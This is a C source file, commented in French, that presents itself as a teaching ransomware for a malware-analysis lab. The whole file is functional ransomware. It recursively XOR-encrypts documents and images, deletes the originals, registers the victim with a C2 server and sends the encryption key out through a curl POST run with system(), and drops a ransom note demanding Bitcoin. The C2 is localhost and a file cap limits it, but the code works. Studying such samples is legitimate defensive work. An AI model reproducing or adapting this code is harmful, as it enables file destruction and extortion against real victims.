/*
 * ransomware.c — Ransomware Pédagogique
 * TP Jour 5 — Analyse Complète d'un Ransomware
 *
 * ⚠️  ÉDUCATIF UNIQUEMENT — Ne pas utiliser en dehors de la VM isolée.
 *
 * Fonctionnement :
 *   1. Génère un victim_id unique (VICTIM_<hostname>_<timestamp>)
 *   2. S'enregistre auprès du serveur C2 via POST /api/register
 *   3. Chiffre les fichiers cibles avec XOR (clé : encryption_key)
 *   4. Exfiltre la clé au C2 via POST /api/key
 *   5. Dépose une note de rançon README_RANSOM.txt
 *
 * Compilation : gcc -g -Wall -O0 -o ransomware ransomware.c
 * Usage       : ./ransomware <dossier_cible>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

/* ============================================================
 * CONFIGURATION — IOCs principaux
 * ============================================================ */

static const char encryption_key[] = "Sup3rS3cr3tK3y2024!";
#define KEY_LENGTH 19

#define C2_HOST "127.0.0.1"
#define C2_PORT 5000

#define ENCRYPTED_EXT ".encrypted"
#define RANSOM_NOTE   "README_RANSOM.txt"
#define MAX_FILES     15

static const char *TARGET_EXTENSIONS[] = {
    ".txt", ".pdf", ".docx", ".xlsx",
    ".jpg", ".png", ".zip", NULL
};

/* ============================================================
 * UTILITAIRES
 * ============================================================ */

int is_target_file(const char *filename) {
    const char *ext = strrchr(filename, '.');
    if (!ext) return 0;
    for (int i = 0; TARGET_EXTENSIONS[i] != NULL; i++)
        if (strcmp(ext, TARGET_EXTENSIONS[i]) == 0) return 1;
    return 0;
}

int is_encrypted(const char *filename) {
    size_t len = strlen(filename);
    size_t ext_len = strlen(ENCRYPTED_EXT);
    if (len < ext_len) return 0;
    return strcmp(filename + len - ext_len, ENCRYPTED_EXT) == 0;
}

void generate_victim_id(char *buf, size_t buf_size) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    long ts = (long)time(NULL);
    snprintf(buf, buf_size, "VICTIM_%s_%ld", hostname, ts);
}

/* ============================================================
 * CHIFFREMENT XOR
 * ============================================================ */

void encrypt(unsigned char *data, size_t data_len,
             const unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++)
        data[i] ^= key[i % key_len];
}

int encrypt_file(const char *filepath) {
    FILE *f = fopen(filepath, "rb");
    if (!f) return -1;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);
    if (size <= 0) { fclose(f); return -1; }

    unsigned char *buf = malloc(size);
    if (!buf) { fclose(f); return -1; }
    fread(buf, 1, size, f);
    fclose(f);

    encrypt(buf, size, (const unsigned char *)encryption_key, KEY_LENGTH);

    char out_path[1024];
    snprintf(out_path, sizeof(out_path), "%s%s", filepath, ENCRYPTED_EXT);
    FILE *out = fopen(out_path, "wb");
    if (!out) { free(buf); return -1; }
    fwrite(buf, 1, size, out);
    fclose(out);
    free(buf);

    remove(filepath);
    printf("[+] Chiffré : %s -> %s\n", filepath, out_path);
    return 0;
}

/* ============================================================
 * PARCOURS DU RÉPERTOIRE
 * ============================================================ */

int encrypt_directory(const char *dirpath, int *count) {
    DIR *d = opendir(dirpath);
    if (!d) return -1;

    struct dirent *entry;
    char full_path[1024];

    while ((entry = readdir(d)) != NULL && *count < MAX_FILES) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        snprintf(full_path, sizeof(full_path), "%s/%s", dirpath, entry->d_name);
        struct stat st;
        if (stat(full_path, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) {
            encrypt_directory(full_path, count);
        } else if (S_ISREG(st.st_mode)) {
            if (!is_encrypted(entry->d_name) && is_target_file(entry->d_name)) {
                if (encrypt_file(full_path) == 0) (*count)++;
            }
        }
    }
    closedir(d);
    return 0;
}

/* ============================================================
 * COMMUNICATION C2
 * ============================================================ */

void send_to_c2(const char *endpoint, const char *json_payload) {
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "curl -s -X POST http://%s:%d%s "
        "-H 'Content-Type: application/json' "
        "-d '%s' > /dev/null 2>&1",
        C2_HOST, C2_PORT, endpoint, json_payload);
    system(cmd);
}

void register_victim(const char *victim_id) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    long ts = (long)time(NULL);
    char payload[512];
    snprintf(payload, sizeof(payload),
        "{\"victim_id\": \"%s\", \"hostname\": \"%s\", \"timestamp\": %ld}",
        victim_id, hostname, ts);
    printf("[*] Enregistrement victime au C2...\n");
    send_to_c2("/api/register", payload);
}

void exfiltrate_key(const char *victim_id) {
    char payload[512];
    snprintf(payload, sizeof(payload),
        "{\"victim_id\": \"%s\", \"key\": \"%s\"}",
        victim_id, encryption_key);
    printf("[*] Envoi de la clé au C2...\n");
    send_to_c2("/api/key", payload);
}

/* ============================================================
 * NOTE DE RANÇON
 * ============================================================ */

void drop_ransom_note(const char *dirpath, const char *victim_id) {
    char note_path[1024];
    snprintf(note_path, sizeof(note_path), "%s/%s", dirpath, RANSOM_NOTE);
    FILE *f = fopen(note_path, "w");
    if (!f) return;
    fprintf(f,
        "======================================================\n"
        "  VOS FICHIERS ONT ETE CHIFFRES\n"
        "======================================================\n\n"
        "Tous vos fichiers ont été chiffrés avec XOR.\n\n"
        "Pour récupérer vos données, payez 0.1 BTC à :\n"
        "  1BoatSLRHtKNngkdXEeobR76b53LETtpyT\n\n"
        "Votre ID victime : %s\n\n"
        "Après paiement, contactez : recovery@example-edu.com\n"
        "Délai : 72 heures\n\n"
        "⚠️  CECI EST UN EXERCICE PÉDAGOGIQUE\n"
        "======================================================\n",
        victim_id);
    fclose(f);
    printf("[+] Note de rançon déposée : %s\n", note_path);
}

/* ============================================================
 * MAIN
 * ============================================================ */

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <dossier_cible>\n", argv[0]);
        return 1;
    }
    const char *target_dir = argv[1];

    printf("======================================================\n");
    printf("  Ransomware Pédagogique — TP Jour 5\n");
    printf("  ⚠️  ÉDUCATIF UNIQUEMENT\n");
    printf("======================================================\n\n");

    char victim_id[512];
    generate_victim_id(victim_id, sizeof(victim_id));
    printf("[*] Victim ID : %s\n", victim_id);

    register_victim(victim_id);

    printf("[*] Chiffrement de : %s\n", target_dir);
    int count = 0;
    encrypt_directory(target_dir, &count);
    printf("[+] %d fichier(s) chiffré(s)\n\n", count);

    exfiltrate_key(victim_id);
    drop_ransom_note(target_dir, victim_id);

    printf("\n[*] Chiffrement terminé. Voir %s\n", RANSOM_NOTE);
    return 0;
}
